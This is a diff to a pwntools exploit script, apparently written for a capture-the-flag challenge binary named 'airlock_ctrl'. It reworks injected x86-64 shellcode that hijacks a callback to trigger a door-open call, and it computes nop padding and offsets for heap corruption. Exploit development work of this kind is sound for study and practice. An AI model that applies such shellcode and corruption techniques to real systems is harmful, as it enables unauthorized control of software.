@@ -3,6 +3,7 @@
 # import variables/functions from pwntools into our global namespace,
 # for easy access
 from pwn import *
+import math
 
 EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/airlock_ctrl'
 context.binary = EXE_PATH
@@ -40,33 +41,38 @@ MALLOC_META_DATA = b'\x00' * 8 + p32(0x51) + b'\x00' * 4
 
 sh = asm(f'''
     push    rbp
-    mov     rbp,rsp
-    movabs  rax, {ORIGINAL_FUNCTION_ADDRESS}
-    mov     rbx, rdi
-    add     rbx, {CHECK_VALUE_OFFSET}
-    cmp     DWORD PTR [rbx], {CHECK_VALUE}
+    movabs  r15, {ORIGINAL_FUNCTION_ADDRESS}
+    mov     r12, rdi
+    add     r12, {CHECK_VALUE_OFFSET}
+    cmp     DWORD PTR [r12], {CHECK_VALUE}
     jne     .L_skip
-    push    rdi
-    push    rsi
-    push    rdx
-    push    rax
+    mov     r12, rdi
+    mov     r13, rsi
+    mov     r14, rdx
     movabs  rax, {INJECT_FUNCTION_ADDRESS}
     mov     edi, {DEVICE_ID}
     mov     esi, {DOOR_DEVICE_ID}
     mov     edx, 1
     call    rax
-    pop     rax
-    mov     qword ptr [{CALLBACK_HEAP_ADDRESS}], rax
-    pop     rdx
-    pop     rsi
-    pop     rdi
-    nop
-    nop
+    mov     rax, {CALLBACK_HEAP_ADDRESS}
+    mov     qword ptr [rax], r15
+    mov     rdi, r12
+    mov     rsi, r13
+    mov     rdx, r14
 .L_skip:
-    call    rax
-    leave
+    call    r15
+    pop     rbp
     ret
-''') + asm('nop') * (12)
+''')
+
+inject_call = sh.index(b'\xFF\xD0')
+corruption_offset = inject_call + 2
+# Account for buffer offset due to FIXED_MESSAGE_SIZE
+corruption_distance = len(sh) - corruption_offset + FIXED_MESSAGE_SIZE
+print(corruption_distance)
+alignment_len = math.ceil((corruption_distance)/16.0) * 16 - corruption_distance
+sh += asm('nop') * alignment_len
+
 
 # To align everything the code after the injection function call needs to be 32 bytes
 # This is to have enough space for the corruption, but also enough for the normal return call.
@@ -111,31 +117,26 @@ with open('./bin/hack_good', 'wb') as fd:
 
 
 #ndisasm -b64 bin/hack_good
-# 000000BD  57                push rdi
-# 000000BE  56                push rsi
-# 000000BF  48BF675D21AE0000  mov rdi,0xae215d67
+# ...
+# 000000CA  FFD0              call rax
+# 000000CC  58                pop rax
+# 000000CD  48A3C4A755555555  mov [qword 0x55555555a7c4],rax
 #          -0000
-# 000000C9  48BE135E21AE0000  mov rsi,0xae215e13
-#          -0000
-# 000000D3  48C7C201000000    mov rdx,0x1
-# 000000DA  FFD0              call rax
-# 000000DC  5E                pop rsi
-# 000000DD  5F                pop rdi
-# 000000DE  48B8E25D55555555  mov rax,0x555555555de2
-#          -0000
-# 000000E8  48A3E8AA55555555  mov [qword 0x55555555aae8],rax
-#          -0000
-# 000000F2  48B8E25D55555555  mov rax,0x555555555de2
-#          -0000
-# 000000FC  FFD0              call rax
-# 000000FE  C9                leave
-# 000000FF  C3                ret
+# 000000D7  5A                pop rdx
+# 000000D8  5E                pop rsi
+# 000000D9  5F                pop rdi
+# 000000DA  90                nop
+# 000000DB  90                nop
+# 000000DC  FFD0              call rax
+# 000000DE  C9                leave
+# 000000DF  C3                ret
+# ...
 
 inject_call = payload.index(b'\xFF\xD0')
 corruption_offset = inject_call + 2
 corruption_len = 16
 
-end_requirement = payload.index(b'\xFF\xD0', corruption_offset)
+end_requirement = payload.index(b'\x41\xFF\xD7', corruption_offset)
 available_len = end_requirement - corruption_offset
 if available_len < corruption_len:
     raise RuntimeError(f'available_len < corruption_len: {available_len} < {corruption_len}')
